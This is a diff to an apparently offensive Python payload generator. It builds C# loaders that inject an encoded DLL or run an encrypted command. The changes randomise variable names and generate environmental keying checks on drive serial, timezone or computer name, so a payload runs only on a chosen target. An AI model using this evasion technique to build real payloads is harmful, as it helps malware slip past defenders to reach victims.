@@ -142,10 +142,13 @@ try:
         elif args.computer:
             check = "string "+envKey+" = System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n\t\t\t" + envKey + " = " + envKey + ".Split('\\\\')[0]"
         elif args.timezone:
-            check = "string "+envKey+" = UTC' + Convert.ToString(System.TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now)).Substring(0,3);"
+            check = "string "+envKey+" = UTC' + Convert.ToString(System.TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now)).Substring(0,3)"
         elif args.driveserial:
-            check = "string "+envKey+" = '';\nManagementObjectSearcher moSearcher = new ManagementObjectSearcher('SELECT * FROM Win32_DiskDrive');\n"
-            check += "foreach (ManagementObject wmi_HD in moSearcher.Get()){"+envKey+" = wmi_HD['SerialNumber'].ToString();break;};"
+            moSearcher = Obfuscator.obfVar()
+            wmi_HD = Obfuscator.obfVar()
+            check = "string "+envKey+" = \"\";\n\t\t\t"
+            check += "ManagementObjectSearcher "+moSearcher+" = new ManagementObjectSearcher(\"SELECT * FROM Win32_DiskDrive\");\n\t\t\t"
+            check += "foreach (ManagementObject "+wmi_HD+" in "+moSearcher+".Get()){"+envKey+" = "+wmi_HD+"[\"SerialNumber\"].ToString();break;}"
         # Replace original variable and function names with obfuscated ones
         with open("templates/spotter-inject.cs", "rt") as fin:
             r1 = fin.read().replace('encDllB64', encDllB64)
@@ -198,8 +201,10 @@ try:
         elif args.timezone:
             check = "string "+envKey+" = UTC' + Convert.ToString(System.TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now)).Substring(0,3);"
         elif args.driveserial:
-            check = "string "+envKey+" = '';\nManagementObjectSearcher moSearcher = new ManagementObjectSearcher('SELECT * FROM Win32_DiskDrive');\n"
-            check += "foreach (ManagementObject wmi_HD in moSearcher.Get()){"+envKey+" = wmi_HD['SerialNumber'].ToString();break;};"
+            moSearcher = Obfuscator.obfVar()
+            wmi_HD = Obfuscator.obfVar()
+            check = "string "+envKey+" = '';\nManagementObjectSearcher "+moSearcher+" = new ManagementObjectSearcher('SELECT * FROM Win32_DiskDrive');\n"
+            check += "foreach (ManagementObject "+wmi_HD+" in "+moSearcher+".Get()){"+envKey+" = "+wmi_HD+"['SerialNumber'].ToString();break;};"
         #print(encrypted)
         with open("templates/spotter-process.cs", "rt") as fin:
             r1 = fin.read().replace('ENCODED_COMMAND', encrypted)
